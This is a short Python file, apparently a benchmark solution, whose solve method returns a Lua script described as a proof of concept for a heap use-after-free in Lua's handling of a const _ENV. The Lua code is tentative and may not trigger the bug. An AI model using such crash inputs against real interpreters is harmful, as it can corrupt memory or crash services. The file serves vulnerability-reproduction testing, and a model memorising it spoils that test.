class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""-- PoC for Lua heap use after free when _ENV is treated as const
local _ENV = _ENV
local const_env = _ENV

function test()
    local x = _ENV
    x = const_env
    return x
end

print(test())

-- Add more code to reach approximate length or trigger specific condition
for i = 1, 100 do
    local y = _ENV
    y = const_env
end

-- Complex expression to potentially trigger codegen bug
local a = (_ENV or const_env).test
local b = a and (_ENV.const or const_env)
local c = b(x) or _ENV

print(c)
"""
        return poc
